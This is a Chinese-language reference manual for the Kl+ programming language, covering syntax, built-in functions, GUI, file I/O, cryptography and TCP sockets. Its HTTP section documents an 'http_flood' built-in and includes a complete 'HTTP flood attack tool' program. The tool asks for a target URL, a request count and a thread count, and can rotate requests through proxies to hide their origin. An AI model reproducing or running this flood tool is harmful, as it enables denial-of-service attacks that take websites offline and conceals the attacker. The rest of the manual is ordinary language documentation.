# Kl+ 编程语言

**Kl+** 是一种现代编译型编程语言，结合了 C/C++ 的低级控制能力和高级语言的表达能力。

- **版本:** 1.3.2
- **支持平台:** Windows

---

## 安装

检查安装：
```bash
kl version
```
> 如果找不到 `kl`，请将 `C:\kl+\bin` 添加到您的 `PATH` 环境变量中。

---

## 快速开始

创建文件 `hello.kl`：
```
fn main() {
    println("Hello, World!");
}
```
运行程序：
```bash
kl run hello.kl
```

---

## 1. 变量

### 不可变变量（默认）
```
let x: i32 = 10;
```

### 可变变量
```
let mut y: i32 = 20;
y = 30;
y += 10;
```

### 短声明（类型推断）
```
z := 42;
name := "Alice";
```

### C 风格声明
```
int a = 100;
float b = 3.14;
string s = "Hello";
```

### 常量
```
const PI: f64 = 3.14159265359;
const MAX_SIZE: i32 = 1000;
```

### `var` — 短可变变量
```
var count = 0;
count += 1;
```

---

## 2. 数据类型

### 整数类型
| 类型       | 大小   | 范围                         |
|-----------|--------|------------------------------|
| `i8`      | 1字节  | -128 到 127                  |
| `i16`     | 2字节  | -32768 到 32767              |
| `i32`/`int` | 4字节 | ±2,147,483,647               |
| `i64`     | 8字节  | ±9,223,372,036,854,775,807   |
| `u8`      | 1字节  | 0 到 255                     |
| `u16`     | 2字节  | 0 到 65535                   |
| `u32`     | 4字节  | 0 到 4,294,967,295           |
| `u64`     | 8字节  | 0 到 18,446,744,073,709,551,615 |

### 浮点类型
| 类型         | 大小   | 精度          |
|-------------|--------|---------------|
| `f32`       | 4字节  | 约7位小数     |
| `f64`/`float` | 8字节 | 约15位小数    |

### 其他类型
| 类型         | 描述                   |
|-------------|------------------------|
| `bool`      | `true` 或 `false`      |
| `char`      | 单个字符 `'A'`         |
| `str`/`string` | 字符串 `"Hello"`      |

### 数字字面量
```
let decimal: i32 = 42;
let hex: i32 = 0xFF;
let binary: i32 = 0b1010;
let octal: i32 = 0o77;
let with_sep: i64 = 1_000_000;
let scientific: f64 = 3.14e-2;
```

---

## 3. 函数

### 基本函数
```
fn add(a: i32, b: i32) -> i32 {
    return a + b;
}

fn main() {
    let result: i32 = add(5, 3);
    println("5 + 3 = %d", result);
}
```

### 无返回值
```
fn greet(name: str) {
    println("Hello, %s!", name);
}
```

### 简短形式
```
fn square(x: i32) -> i32 => x * x;
fn double(x: i32) -> i32 => x * 2;
```

### 默认参数值
```
fn power(base: f64, exp: i32 = 2) -> f64 {
    let mut result: f64 = 1.0;
    for i in 0..exp {
        result = result * base;
    }
    return result;
}

fn main() {
    println("%f", power(3.0));      // 9.0
    println("%f", power(2.0, 10));  // 1024.0
}
```

### 公有函数
```
pub fn api_function() {
    // 可从其他模块访问
}
```

---

## 4. 运算符

### 算术运算符
| 运算符 | 描述 | 示例           |
|--------|------|----------------|
| `+`    | 加法 | `5 + 3 → 8`    |
| `-`    | 减法 | `5 - 3 → 2`    |
| `*`    | 乘法 | `5 * 3 → 15`   |
| `/`    | 除法 | `7 / 2 → 3`    |
| `%`    | 取余 | `7 % 3 → 1`    |
| `**`   | 幂   | `2 ** 10 → 1024` |

```
fn main() {
    println("10 + 3 = %d", 10 + 3);
    println("10 - 3 = %d", 10 - 3);
    println("10 * 3 = %d", 10 * 3);
    println("10 / 3 = %d", 10 / 3);
}
```

### 比较运算符
| 运算符 | 描述       |
|--------|------------|
| `==`   | 等于       |
| `!=`   | 不等于     |
| `<`    | 小于       |
| `>`    | 大于       |
| `<=`   | 小于等于   |
| `>=`   | 大于等于   |

```
fn main() {
    let a: i32 = 10;
    let b: i32 = 20;
    if a < b {
        println("a 小于 b");
    }
}
```

### 逻辑运算符
| 运算符 | 描述 |
|--------|------|
| `&&`   | 与   |
| `\|\|` | 或   |
| `!`    | 非   |

```
fn main() {
    let age: i32 = 25;
    let has_license: bool = true;
    if age >= 18 && has_license {
        println("通过");
    }
}
```

### 位运算符
| 运算符 | 描述     |
|--------|----------|
| `&`    | 按位与   |
| `\|`   | 按位或   |
| `^`    | 按位异或 |
| `~`    | 按位非   |
| `<<`   | 左移     |
| `>>`   | 右移     |

```
fn main() {
    let a: i32 = 0b1010;
    let b: i32 = 0b1100;
    println("a & b = %d", a & b);   // 8 (0b1000)
    println("a << 2 = %d", a << 2); // 40 (0b101000)
}
```

### 赋值运算符
```
fn main() {
    let mut x: i32 = 10;
    x = 20;
    x += 5;   // 25
    x -= 3;   // 22
    x *= 2;   // 44
    x /= 4;   // 11
    x %= 3;   // 2
    println("x = %d", x);
}
```

### 自增和自减
```
fn main() {
    let mut i: i32 = 0;
    i++;      // 后置
    ++i;      // 前置
    i--;
    --i;
    println("i = %d", i);
}
```

### 三元运算符
```
fn main() {
    let age: i32 = 20;
    let status: str = age >= 18 ? "adult" : "minor";
    println("Status: %s", status);
}
```

---

## 5. 控制流

### If / Elif / Else
```
fn main() {
    let score: i32 = 85;
    if score >= 90 {
        println("优秀！");
    } elif score >= 70 {
        println("良好");
    } elif score >= 50 {
        println("及格");
    } else {
        println("不及格");
    }
}
```

### For 循环（范围）
```
fn main() {
    // 0..10 (不包含10)
    for i in 0..10 {
        println("%d", i);
    }
    
    // 1..=10 (包含10)
    for i in 1..=10 {
        println("%d", i);
    }
}
```

### For 循环（步长）
```
fn main() {
    for i in 0..10 step 2 {
        println("%d", i);  // 0, 2, 4, 6, 8
    }
}
```

### For 循环（过滤）
```
fn main() {
    for i in 0..20 where i % 2 == 0 {
        println("%d", i);  // 偶数
    }
}
```

### For 循环（C风格）
```
fn main() {
    for (int i = 0; i < 10; i++) {
        println("%d", i);
    }
}
```

### For-Else
```
fn main() {
    for i in 0..10 {
        if i == 5 {
            println("找到5！");
            break;
        }
    } else {
        println("未找到");  // 如果没有break则执行
    }
}
```

### While 循环
```
fn main() {
    let mut count: i32 = 0;
    while count < 5 {
        println("计数: %d", count);
        count += 1;
    }
}
```

### Do-While 循环
```
fn main() {
    let mut i: i32 = 0;
    do {
        println("i = %d", i);
        i += 1;
    } while i < 3;
}
```

### Loop 循环（无限）
```
fn main() {
    let mut counter: i32 = 0;
    loop {
        println("计数器: %d", counter);
        counter += 1;
        if counter >= 5 {
            break;
        }
    }
}
```

### Break 和 Continue
```
fn main() {
    for i in 0..10 {
        if i == 3 { continue; }
        if i == 7 { break; }
        println("%d", i);  // 0,1,2,4,5,6
    }
}
```

### Match 匹配
```
fn main() {
    let day: i32 = 3;
    match day {
        1 => println("星期一"),
        2 => println("星期二"),
        3 => println("星期三"),
        4 => println("星期四"),
        5 => println("星期五"),
        _ => println("周末")
    }
}
```

---

## 6. 结构体

### 声明和使用
```
struct Point {
    x: i32,
    y: i32
}

fn main() {
    let mut p: Point;
    p.x = 10;
    p.y = 20;
    println("坐标: (%d, %d)", p.x, p.y);
}
```

### 方法 (impl)
```
struct Rectangle {
    width: i32,
    height: i32
}

impl Rectangle {
    pub fn area(self) -> i32 {
        return self.width * self.height;
    }
    
    pub fn scale(&mut self, factor: i32) {
        self.width *= factor;
        self.height *= factor;
    }
}

fn main() {
    let mut rect: Rectangle;
    rect.width = 10;
    rect.height = 5;
    println("面积: %d", rect.area());
    
    rect.scale(2);
    println("新面积: %d", rect.area());
}
```

---

## 7. 枚举

```
enum Color {
    Red,
    Green,
    Blue
}

enum Status {
    Ok = 200,
    NotFound = 404,
    Error = 500
}

fn main() {
    let status: Status = Status::Ok;
    match status {
        Status::Ok => println("成功"),
        Status::NotFound => println("未找到"),
        Status::Error => println("错误")
    }
}
```

---

## 8. 内存管理

### 分配和释放
```
fn main() {
    let arr: ptr<i32> = alloc(i32, 10);
    arr[0] = 100;
    arr[1] = 200;
    println("arr[0] = %d", arr[0]);
    println("arr[1] = %d", arr[1]);
    free arr;
}
```

### 指针
```
fn main() {
    let mut x: i32 = 42;
    let ptr: ptr<i32> = &x;
    let value: i32 = *ptr;
    println("x = %d, *ptr = %d", x, value);
    
    *ptr = 100;
    println("x = %d", x);  // 100
}
```

### sizeof 和 cast
```
fn main() {
    println("sizeof(i32) = %d", sizeof(i32));
    
    let i: i32 = 65;
    let c: char = cast<char>(i);
    println("字符: %c", c);  // 'A'
    
    let f: f64 = 3.14;
    let n: i32 = cast<i32>(f);
    println("整数: %d", n);  // 3
}
```

### 不安全代码块
```
fn main() {
    unsafe {
        let raw: ptr<u8> = alloc(u8, 256);
        raw[0] = 72;
        raw[1] = 0;
        free raw;
    }
}
```

---

## 9. 内置函数

### 输入/输出
| 函数             | 描述               |
|-----------------|--------------------|
| `print("text")` | 打印（不换行）     |
| `println("text")`| 打印（换行）       |
| `input()`       | 读取字符串输入     |
| `input_int()`   | 读取整数输入       |
| `input_float()` | 读取浮点数输入     |

```
fn main() {
    print("请输入姓名: ");
    let name: str = input();
    print("请输入年龄: ");
    let age: i32 = input_int();
    println("你好，%s！年龄：%d", name, age);
}
```

### 数学函数
| 函数                    | 描述               |
|------------------------|--------------------|
| `sqrt(x)`              | 平方根             |
| `pow(base, exp)`       | 幂运算             |
| `abs(x)`               | 绝对值（整数）     |
| `fabs(x)`              | 绝对值（浮点数）   |
| `floor(x)`, `ceil(x)`  | 向下/向上取整      |
| `round(x)`             | 四舍五入           |
| `sin(x)`, `cos(x)`, `tan(x)` | 三角函数      |
| `log(x)`, `log10(x)`   | 对数               |
| `exp(x)`               | 指数               |
| `min(a,b)`, `max(a,b)` | 最小/最大（整数）  |
| `fmin(a,b)`, `fmax(a,b)` | 最小/最大（浮点数）|
| `clamp(x, lo, hi)`     | 限制值在范围内     |

```
fn main() {
    println("sqrt(16) = %f", sqrt(16.0));
    println("pow(2, 10) = %f", pow(2.0, 10.0));
    println("abs(-42) = %d", abs(-42));
    println("clamp(15, 0, 10) = %d", clamp(15, 0, 10));  // 10
}
```

### 随机数
| 函数                    | 描述               |
|------------------------|--------------------|
| `rand()`               | 随机数 (0..RAND_MAX) |
| `rand_range(min, max)` | 指定范围内的随机数 |
| `srand(seed)`          | 设置随机种子       |

```
fn main() {
    srand(42);
    println("rand() = %d", rand());
    println("rand_range(1, 100) = %d", rand_range(1, 100));
}
```

### 字符串函数
| 函数             | 描述                 |
|-----------------|----------------------|
| `strlen(s)`     | 字符串长度           |
| `strcmp(a, b)`  | 比较（0表示相等）    |

```
fn main() {
    let s: str = "Hello";
    println("长度: %d", strlen(s));
    
    if strcmp("abc", "abc") == 0 {
        println("相等！");
    }
}
```

### 实用工具
| 函数                  | 描述               |
|----------------------|--------------------|
| `exit(code)`         | 退出程序           |
| `assert(cond, msg)`  | 检查条件           |
| `sizeof(type)`       | 类型大小（字节）   |

---

## 10. 输出格式化

| 格式化符 | 类型       | 示例                     |
|---------|-----------|--------------------------|
| `%d`    | `i32`     | `println("%d", 42)`      |
| `%lld`  | `i64`     | `println("%lld", 123456789)` |
| `%f`    | `f64`     | `println("%f", 3.14)`    |
| `%s`    | `str`     | `println("%s", "hello")` |
| `%c`    | `char`    | `println("%c", 65)`      |
| `%%`    | % 符号    | `println("100%%")`       |

---

## 11. 命令行命令

```bash
kl build main.kl --console output.exe    # 编译控制台应用程序
kl build main.kl --app output.exe        # 编译GUI应用程序
kl run main.kl                           # 构建并运行
kl check main.kl                         # 语法检查
kl tokens main.kl                        # 显示标记
kl version                               # 编译器版本
kl help                                  # 帮助
```

---

## 12. HTTP/HTTPS 函数

### GET 请求

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `http_get(url)` | HTTP GET 请求 | `str` — 响应体 |
| `https_get(url)` | HTTPS GET 请求 | `str` — 响应体 |
| `http_get_status(url)` | HTTP 状态码 | `i32` — 状态码 (200, 404...) |
| `https_get_status(url)` | HTTPS 状态码 | `i32` — 状态码 (200, 404...) |

---

### POST 请求

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `http_post(url, data)` | HTTP POST 请求 | `str` — 响应体 |
| `https_post(url, data)` | HTTPS POST 请求 | `str` — 响应体 |

---

### 代理

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `https_get_proxy(url, proxy)` | 通过代理的 HTTPS GET | `str` — 响应体 |
| `https_post_proxy(url, data, proxy)` | 通过代理的 HTTPS POST | `str` — 响应体 |
| `https_get_status_proxy(url, proxy)` | 通过代理的 HTTPS 状态码 | `i32` — 状态码 |

**代理格式：**
- `"http://ip:port"`
- `"ip:port"`

---

### 文件下载

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `http_download(url, filename)` | 下载文件 | `i32` — 0 = 成功，-1 = 错误 |

---

### 多线程请求

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `http_flood(url, count, threads)` | 并行 GET 请求 | `i32` — 成功数量 |

---

### 内存管理

| 函数 | 描述 |
|------|------|
| `http_free(response)` | 释放响应内存 |

---

### HTTP 洪水攻击示例

```
fn main() {
    println("================================");
    println("   Kl+ HTTP 洪水攻击工具 v2.0");
    println("================================");
    println("");
    
    // URL 输入
    print("请输入目标 URL: ");
    let url: str = input();
    
    // 请求次数输入
    print("请求次数？ ");
    let count: i32 = input_int();
    
    // 线程数输入
    print("线程数 (1-64): ");
    let threads: i32 = input_int();
    
    // 模式选择
    println("");
    println("模式：");
    println("  1 - 无代理（直接）");
    println("  2 - 使用代理");
    print("请选择 (1-2): ");
    let mode: i32 = input_int();
    
    println("");
    
    if mode == 1 {
        // 无代理 - 多线程洪水攻击
        println("开始 %d 次请求，使用 %d 个线程...", count, threads);
        println("");
        
        let success: i32 = http_flood(url, count, threads);
        
        println("");
        println("================================");
        println("  结果：");
        println("  总数：   %d", count);
        println("  成功：   %d", success);
        println("  失败：   %d", count - success);
        println("================================");
    } elif mode == 2 {
        // 使用代理 - 手动输入
        println("请输入代理 (格式: ip:port)");
        println("输入空行停止");
        println("");
        
        // 最多存储20个代理
        let mut p1: str = "";
        let mut p2: str = "";
        let mut p3: str = "";
        let mut p4: str = "";
        let mut p5: str = "";
        let mut proxy_count: i32 = 0;
        
        print("代理 1: ");
        p1 = input();
        if strlen(p1) > 3 { proxy_count = 1; }
        
        if proxy_count >= 1 {
            print("代理 2 (或留空): ");
            p2 = input();
            if strlen(p2) > 3 { proxy_count = 2; }
        }
        
        if proxy_count >= 2 {
            print("代理 3 (或留空): ");
            p3 = input();
            if strlen(p3) > 3 { proxy_count = 3; }
        }
        
        if proxy_count >= 3 {
            print("代理 4 (或留空): ");
            p4 = input();
            if strlen(p4) > 3 { proxy_count = 4; }
        }
        
        if proxy_count >= 4 {
            print("代理 5 (或留空): ");
            p5 = input();
            if strlen(p5) > 3 { proxy_count = 5; }
        }
        
        println("");
        println("使用 %d 个代理", proxy_count);
        println("开始 %d 次请求，使用 %d 个线程...", count, threads);
        println("");
        
        // 发送请求，轮换代理
        let mut success: i32 = 0;
        let mut fail: i32 = 0;
        
        for i in 1..=count {
            let mut current_proxy: str = p1;
            let proxy_idx: i32 = (i - 1) % proxy_count;
            
            if proxy_idx == 0 { current_proxy = p1; }
            elif proxy_idx == 1 { current_proxy = p2; }
            elif proxy_idx == 2 { current_proxy = p3; }
            elif proxy_idx == 3 { current_proxy = p4; }
            elif proxy_idx == 4 { current_proxy = p5; }
            
            let status: i32 = https_get_status_proxy(url, current_proxy);
            
            if status >= 200 && status < 400 {
                success += 1;
                println("  [%d/%d] 代理: %s -> %d 成功", i, count, current_proxy, status);
            } else {
                fail += 1;
                println("  [%d/%d] 代理: %s -> %d 失败", i, count, current_proxy, status);
            }
        }
        
        println("");
        println("================================");
        println("  结果：");
        println("  总数：   %d", count);
        println("  成功：   %d", success);
        println("  失败：   %d", fail);
        println("  代理数： %d", proxy_count);
        println("================================");
    } else {
        println("无效模式！");
    }
}
```

---

## 13. 程序示例

### 斐波那契数列
```
fn fib(n: i32) -> i64 {
    if n <= 1 { return n; }
    
    let mut a: i64 = 0;
    let mut b: i64 = 1;
    
    for i in 2..=n {
        let temp: i64 = a + b;
        a = b;
        b = temp;
    }
    return b;
}

fn main() {
    for i in 0..20 {
        println("fib(%d) = %lld", i, fib(i));
    }
}
```

### 素数判断
```
fn is_prime(n: i32) -> bool {
    if n <= 1 { return false; }
    if n <= 3 { return true; }
    if n % 2 == 0 { return false; }
    
    let mut i: i32 = 3;
    while i * i <= n {
        if n % i == 0 { return false; }
        i += 2;
    }
    return true;
}

fn main() {
    for n in 2..=100 {
        if is_prime(n) {
            print("%d ", n);
        }
    }
    println("");
}
```

### 猜数字游戏
```
fn main() {
    srand(42);
    let secret: i32 = rand_range(1, 100);
    let mut attempts: i32 = 0;

    println("=== 猜数字游戏 ===");
    println("数字范围 1 到 100");

    loop {
        print("你的猜测：");
        let guess: i32 = input_int();
        attempts += 1;

        if guess < secret {
            println("太小了！");
        } elif guess > secret {
            println("太大了！");
        } else {
            println("正确！你猜了 %d 次！", attempts);
            break;
        }
    }
}
```

### 计算器
```
fn main() {
    println("=== 计算器 ===");

    print("第一个数字：");
    let a: f64 = input_float();

    print("运算符 (+, -, *, /)：");
    let op: str = input();

    print("第二个数字：");
    let b: f64 = input_float();

    if strcmp(op, "+") == 0 {
        println("结果：%f", a + b);
    } elif strcmp(op, "-") == 0 {
        println("结果：%f", a - b);
    } elif strcmp(op, "*") == 0 {
        println("结果：%f", a * b);
    } elif strcmp(op, "/") == 0 {
        if b != 0.0 {
            println("结果：%f", a / b);
        } else {
            println("除数不能为零！");
        }
    } else {
        println("未知运算符！");
    }
}
```

### 控制台游戏模板
```
struct Player {
    x: i32,
    y: i32,
    health: i32,
    score: i32
}

fn main() {
    srand(12345);

    let mut player: Player;
    player.x = 5;
    player.y = 5;
    player.health = 100;
    player.score = 0;

    let mut running: bool = true;

    println("=== 我的游戏 ===");
    println("命令：w/a/s/d = 移动，q = 退出");

    while running && player.health > 0 {
        println("");
        println("位置：(%d, %d)", player.x, player.y);
        println("生命值：%d  分数：%d", player.health, player.score);

        print("> ");
        let cmd: str = input();

        if strcmp(cmd, "w") == 0 {
            player.y -= 1;
        } elif strcmp(cmd, "s") == 0 {
            player.y += 1;
        } elif strcmp(cmd, "a") == 0 {
            player.x -= 1;
        } elif strcmp(cmd, "d") == 0 {
            player.x += 1;
        } elif strcmp(cmd, "q") == 0 {
            running = false;
        } else {
            println("未知命令！");
        }

        player.score += 10;
    }

    println("");
    println("游戏结束！最终分数：%d", player.score);
}
```

## 14. 导入系统

### 文件包含
```
import "myfile.kl";
```
包含另一个 `.kl` 文件的内容。首先在当前文件夹中搜索，然后在 `stdlib/` 中搜索。

---

## 15. 错误处理

### Try / Catch / Throw
```
try {
    throw "Something went wrong!";
} catch (err) {
    println("Error: %s", err);
}
```

| 关键字 | 描述 |
|--------|------|
| `try` | 可能引发错误的代码块 |
| `catch (err)` | 捕获错误，`err` 是错误消息字符串 |
| `throw "msg"` | 抛出错误 |

---

## 16. 定时器

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `timer_start()` | 启动定时器 | — |
| `timer_end()` | 停止并获取时间 | `f64` — 毫秒 |
| `timer_ms()` | 当前时间（毫秒） | `f64` |
| `timer_us()` | 当前时间（微秒） | `f64` |
| `sleep(seconds)` | 暂停（秒） | — |
| `sleep_ms(ms)` | 暂停（毫秒） | — |

```
timer_start();
// ... 代码 ...
let elapsed: f64 = timer_end();
println("Time: %f ms", elapsed);

sleep(1);
sleep_ms(500);
```

---

## 17. 文件输入/输出

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `file_read(path)` | 读取文件 | `str` — 内容 |
| `file_write(path, content)` | 写入文件 | `i32` — 0 = 成功 |
| `file_append(path, content)` | 追加到文件 | `i32` — 0 = 成功 |
| `file_exists(path)` | 检查文件是否存在 | `i32` — 1 = 存在 |
| `file_delete(path)` | 删除文件 | `i32` — 0 = 成功 |
| `file_copy(src, dst)` | 复制文件 | `i32` — 0 = 成功 |
| `file_size(path)` | 文件大小 | `i64` — 字节 |
| `file_lines(path)` | 行数 | `i32` |
| `file_read_bytes(path, offset, count)` | 读取字节 | `str` |
| `file_write_bytes(path, data, length)` | 写入字节 | `i32` — 0 = 成功 |

```
file_write("test.txt", "Hello World!\n");
let content: str = file_read("test.txt");
println("%s", content);

if file_exists("test.txt") == 1 {
    let size: i64 = file_size("test.txt");
    println("Size: %lld bytes", size);
}

file_append("test.txt", "New line\n");
file_copy("test.txt", "backup.txt");
file_delete("backup.txt");
```

---

## 18. 图形用户界面 (GUI)

### 消息框

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `msgbox(title, message)` | 信息框 | `i32` |
| `msgbox_yesno(title, message)` | 是/否框 | `i32` — 1 = 是，0 = 否 |
| `msgbox_yesnocancel(title, message)` | 是/否/取消框 | `i32` — 1/0/-1 |
| `msgbox_error(title, message)` | 错误框 | — |
| `msgbox_warning(title, message)` | 警告框 | — |
| `notification(title, message)` | 系统通知 | — |

```
msgbox("Info", "Hello from Kl+!");

let answer: i32 = msgbox_yesno("Question", "Continue?");
if answer == 1 {
    println("Yes!");
}

msgbox_error("Error", "Something failed!");
```

### 输入对话框

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `input_dialog(title, prompt)` | 文本输入对话框 | `str` |

```
let name: str = input_dialog("Input", "Enter your name:");
println("Hello, %s!", name);
```

### 文件对话框

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `file_open_dialog(title, filter)` | 打开文件对话框 | `str` — 路径 |
| `file_save_dialog(title, filter)` | 保存文件对话框 | `str` — 路径 |

```
let path: str = file_open_dialog("Open", "Text Files\0*.txt\0");
println("Selected: %s", path);
```

### 颜色选择器

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `color_dialog()` | 颜色选择器 | `i32` — RGB值，-1 = 取消 |

```
let color: i32 = color_dialog();
println("Color: %d", color);
```

### 剪贴板

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `clipboard_set(text)` | 复制到剪贴板 | `i32` — 0 = 成功 |
| `clipboard_get()` | 从剪贴板获取 | `str` |

```
clipboard_set("Hello from Kl+!");
let text: str = clipboard_get();
println("Clipboard: %s", text);
```

### 窗口系统

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `gui_window(title, width, height)` | 创建窗口 | `i32` — 窗口ID |
| `gui_button(win, text, x, y, w, h, id)` | 添加按钮 | — |
| `gui_label(win, text, x, y, w, h, id)` | 添加标签 | — |
| `gui_textbox(win, text, x, y, w, h, id)` | 添加文本框 | — |
| `gui_textbox_multi(win, text, x, y, w, h, id)` | 多行文本框 | — |
| `gui_checkbox(win, text, x, y, w, h, id)` | 添加复选框 | — |
| `gui_progressbar(win, x, y, w, h, id)` | 进度条 | — |
| `gui_set_progress(win, id, value)` | 设置进度 (0-100) | — |
| `gui_get_text(win, id)` | 获取元素文本 | `str` |
| `gui_set_text(win, id, text)` | 设置元素文本 | — |
| `gui_is_checked(win, id)` | 复选框状态 | `i32` — 1 = 已选中 |
| `gui_run(win)` | 运行窗口循环 | `i32` |
| `gui_close(win)` | 关闭窗口 | — |
| `gui_show(win)` | 显示窗口 | — |
| `gui_hide(win)` | 隐藏窗口 | — |
| `gui_set_title(win, title)` | 修改标题 | — |
| `gui_enable(win, id, enabled)` | 启用/禁用元素 | — |

```
let win: i32 = gui_window("My App", 400, 300);
gui_label(win, "Hello!", 20, 20, 200, 25, 1);
gui_textbox(win, "", 20, 50, 200, 25, 2);
gui_button(win, "Click Me", 20, 90, 100, 30, 3);
gui_checkbox(win, "Option", 20, 130, 150, 25, 4);
gui_progressbar(win, 20, 170, 350, 25, 5);
gui_set_progress(win, 5, 75);
gui_run(win);
```
## 19. GUI 事件

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `gui_update(win)` | 更新窗口（用于事件循环） | `i32` — 1 = 运行中，0 = 已关闭 |
| `gui_poll_event()` | 获取下一个事件 | `i32` — 1 = 有事件，0 = 无 |
| `gui_get_event_id()` | 触发事件的元素ID | `i32` |
| `gui_get_event_type()` | 事件类型（1=点击，2=更改） | `i32` |

```
let win: i32 = gui_window("My App", 400, 300);
gui_button(win, "Click Me", 20, 20, 100, 30, 10);

while gui_update(win) == 1 {
    while gui_poll_event() == 1 {
        let id: i32 = gui_get_event_id();
        if id == 10 {
            msgbox("Info", "Button clicked!");
        }
    }
    sleep_ms(16);
}
```

---

## 20. GUI 样式

| 函数 | 描述 |
|------|------|
| `gui_set_color(win, id, r, g, b)` | 文本颜色（RGB 0-255） |
| `gui_set_bg_color(win, id, r, g, b)` | 背景颜色（RGB 0-255） |
| `gui_set_font(win, id, "name", size)` | 字体和大小 |
| `gui_set_font_bold(win, id, 1)` | 粗体（1=是，0=否） |
| `gui_set_visible(win, id, 1)` | 可见性（1=显示，0=隐藏） |
| `gui_set_size(win, id, w, h)` | 更改元素大小 |
| `gui_set_pos(win, id, x, y)` | 更改元素位置 |

```
gui_set_color(win, 1, 255, 0, 0);
gui_set_bg_color(win, 1, 30, 30, 30);
gui_set_font(win, 1, "Arial", 20);
gui_set_font_bold(win, 1, 1);
gui_set_visible(win, 5, 0);
gui_set_size(win, 3, 300, 40);
gui_set_pos(win, 3, 50, 100);
```

---

## 21. GUI 对话框

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `msgbox_yesnocancel(title, msg)` | 是/否/取消对话框 | `i32` — 1=是，0=否，-1=取消 |
| `file_open_dialog(title, filter)` | 打开文件对话框 | `str` — 文件路径 |
| `file_save_dialog(title, filter)` | 保存文件对话框 | `str` — 文件路径 |
| `color_dialog()` | 颜色选择器 | `i32` — RGB值 |
| `clipboard_set(text)` | 复制到剪贴板 | `i32` — 0=成功 |
| `clipboard_get()` | 从剪贴板获取 | `str` |
| `notification(title, msg)` | 系统通知 | — |

```
let path: str = file_open_dialog("Open", "Text\0*.txt\0");
let color: i32 = color_dialog();
clipboard_set("Hello!");
let text: str = clipboard_get();
```

---

## 22. 内存管理

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `mem_zero(ptr, size)` | 将内存块置零 | — |
| `mem_fill(ptr, value, size)` | 用字节填充 | — |
| `mem_copy(dst, src, size)` | 复制内存块 | — |
| `mem_compare(a, b, size)` | 比较内存块（0=相等） | `i32` |
| `mem_swap_int(&a, &b)` | 交换两个int | — |
| `mem_swap_float(&a, &b)` | 交换两个float | — |
| `mem_realloc(ptr, new_size)` | 重新分配内存大小 | `ptr` |
| `mem_info()` | 显示内存信息 | — |
| `mem_active_count()` | 活动分配数量 | `i32` |
| `mem_total_bytes()` | 分配的总字节数 | `i32` |

```
let arr: ptr<i32> = alloc(i32, 10);
mem_zero(arr, 10 * 4);
mem_fill(arr, 0xFF, 10 * 4);

let copy: ptr<i32> = alloc(i32, 10);
mem_copy(copy, arr, 10 * 4);

let eq: i32 = mem_compare(arr, copy, 10 * 4);

let mut a: i32 = 10;
let mut b: i32 = 20;
mem_swap_int(&a, &b);

mem_info();
free arr;
free copy;
```

---

## 23. 数组工具

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `array_fill_int(arr, count, value)` | 用值填充数组 | — |
| `array_fill_float(arr, count, value)` | 填充float数组 | — |
| `array_reverse_int(arr, count)` | 反转数组 | — |
| `array_sum_int(arr, count)` | 元素总和 | `i32` |
| `array_min_int(arr, count)` | 最小元素 | `i32` |
| `array_max_int(arr, count)` | 最大元素 | `i32` |
| `array_find_int(arr, count, value)` | 查找元素（-1=未找到） | `i32` |
| `array_sort_int(arr, count)` | 升序排序 | — |
| `array_print_int(arr, count)` | 打印数组 | — |

```
let arr: ptr<i32> = alloc(i32, 5);
arr[0] = 42; arr[1] = 17; arr[2] = 93; arr[3] = 5; arr[4] = 71;

array_print_int(arr, 5);
array_sort_int(arr, 5);
array_print_int(arr, 5);

println("Sum: %d", array_sum_int(arr, 5));
println("Min: %d", array_min_int(arr, 5));
println("Max: %d", array_max_int(arr, 5));

let idx: i32 = array_find_int(arr, 5, 42);
println("Found 42 at index: %d", idx);

array_reverse_int(arr, 5);
array_fill_int(arr, 5, 0);

free arr;
```

## 24. 加密

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `md5(text)` | MD5哈希 | `str` — 32个十六进制字符 |
| `sha1(text)` | SHA1哈希 | `str` — 40个十六进制字符 |
| `sha256(text)` | SHA256哈希 | `str` — 64个十六进制字符 |
| `base64_encode(text)` | Base64编码 | `str` |
| `base64_decode(text)` | Base64解码 | `str` |
| `xor_crypt(text, key)` | XOR加密/解密 | `str` |
| `random_bytes(count)` | 随机字节（十六进制） | `str` |
| `uuid()` | 生成UUID v4 | `str` |
| `crc32(text)` | CRC32校验和 | `i32` |

```
let hash: str = sha256("Hello");
let encoded: str = base64_encode("Secret");
let decoded: str = base64_decode(encoded);
let id: str = uuid();
let checksum: i32 = crc32("data");
```

---

## 25. TCP套接字

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `tcp_connect(host, port)` | 连接到服务器 | `i32` — 套接字（-1 = 错误） |
| `tcp_send(sock, data)` | 发送数据 | `i32` — 发送的字节数 |
| `tcp_send_bytes(sock, data, len)` | 发送N个字节 | `i32` |
| `tcp_recv(sock, max_size)` | 接收数据 | `str` |
| `tcp_recv_bytes(sock, buf, max)` | 接收到缓冲区 | `i32` — 接收的字节数 |
| `tcp_close(sock)` | 关闭连接 | — |
| `tcp_set_timeout(sock, ms)` | 设置超时 | `i32` |

```
let sock: i32 = tcp_connect("example.com", 80);
tcp_send(sock, "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n");
let response: str = tcp_recv(sock, 4096);
tcp_close(sock);
```

---

## 26. TCP服务器

| 函数 | 描述 | 返回值 |
|------|------|--------|
| `tcp_listen(port, backlog)` | 创建服务器 | `i32` — 套接字 |
| `tcp_accept(server_sock)` | 接受连接 | `i32` — 客户端套接字 |
| `tcp_get_client_ip(client)` | 客户端IP | `str` |

```
let server: i32 = tcp_listen(8080, 5);
let client: i32 = tcp_accept(server);
let ip: str = tcp_get_client_ip(client);
tcp_send(client, "Hello from Kl+!");
tcp_close(client);
tcp_close(server);
```

---

## 27. UDP套接字

| 函数 | 描述 | 返回值 |
